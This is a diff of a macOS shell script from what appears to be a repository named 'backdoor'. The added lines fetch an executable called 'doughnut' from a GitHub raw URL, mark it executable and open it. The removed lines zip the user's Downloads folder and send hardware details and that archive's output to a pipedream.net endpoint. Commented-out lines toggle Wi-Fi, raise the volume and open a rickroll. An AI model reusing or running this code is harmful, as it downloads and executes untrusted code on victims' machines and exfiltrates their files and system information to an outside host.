@@ -3,20 +3,20 @@ curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.wolfov
 # cd ..
 # echo "success" >> .bombmaterials
 # cd ..
-cd ~/Downloads
-zip -r ../.downloads.zip *
-# cd ~/Desktop
-# curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/doughnut"
-# chmod +x doughnut
-# open doughnut
+# cd ~/Downloads
+# zip -r ../.downloads.zip *
+cd ~/Desktop
+curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/doughnut"
+chmod +x doughnut
+open doughnut
 # networksetup -setnetworkserviceenabled "Wi-Fi" off
 sleep 20
 # networksetup -setnetworkserviceenabled "Wi-Fi" on
 # do osascript -e "set volume output volume 100"
 # open https://shattereddisk.github.io/rickroll/rickroll.mp4
-curl -d '{                      
- \"sysinfo\": \"'"$(system_profiler SPHardwareDataType)"'\"
- \"password\": \"'"$(zip -r ../.downloads.zip *)"'\"
-}' -H "Content-Type: application/json" https://eojlk5hggkgar9y.m.pipedream.net
+# curl -d '{                      
+#  \"sysinfo\": \"'"$(system_profiler SPHardwareDataType)"'\"
+#  \"password\": \"'"$(zip -r ../.downloads.zip *)"'\"
+# }' -H "Content-Type: application/json" https://eojlk5hggkgar9y.m.pipedream.net
 
 
